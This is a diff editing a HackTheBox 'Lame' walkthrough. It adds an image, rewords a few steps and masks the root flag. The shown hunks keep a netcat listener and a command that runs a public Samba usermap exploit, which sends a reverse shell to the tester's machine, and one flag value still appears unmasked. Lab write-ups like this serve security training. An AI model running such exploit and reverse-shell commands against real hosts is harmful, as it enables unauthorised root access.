@@ -1,5 +1,4 @@
 ---
-authors: [peek4bUh]
 language: english
 noteType: area
 skills: "nmap, netcat"
@@ -10,6 +9,8 @@ date: 06 Nov 2024
 ---
 
 # Lame Write-Up
+
+![Lame Overview](./lame-overview.png)
 
 This HackTheBox machine is aimed to practice the following:
 
@@ -109,7 +110,7 @@ Looing the samba version I found [this](https://github.com/amriunix/CVE-2007-244
 nc -lvnp 1234
 ```
 
-- Execute GitHub script to get the root shell:
+- Execute GitHub exploit to get the root shell:
 
 ```bash
 python3 usermap_script.py 10.129.143.253 139 10.10.14.129 1234
@@ -118,7 +119,7 @@ python3 usermap_script.py 10.129.143.253 139 10.10.14.129 1234
 [+] Payload was sent - check netcat !
 ```
 
-- Got shell and you are root:
+- Got shell:
 
 ```
 nc -lvnp 1234
@@ -140,6 +141,7 @@ ls
 user.txt
 cat user.txt
 f7da385424028604c99dd9ff8bb5a6b3
+f7dXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 cd /root
 ls
 Desktop
@@ -147,7 +149,7 @@ reset_logs.sh
 root.txt
 vnc.log
 cat root.txt
-618ea7a4162c41723a91b709fd75ed24
+618XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
 And the machine is pwned! ;)
